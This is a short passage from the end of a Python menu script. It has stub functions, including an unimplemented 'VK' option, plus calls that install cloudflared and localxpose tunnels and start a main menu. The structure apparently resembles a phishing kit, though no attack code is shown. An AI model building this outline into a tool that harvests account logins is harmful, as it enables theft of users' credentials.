    # Implement the logic for VK here

def about():
    print("About section triggered.")
    # Implement the logic for the About section here

def msg_exit():
    print("Exiting the program.")
    exit()          
    
kill_pid()
check_status()
install_cloudflared()
install_localxpose()
main_menu()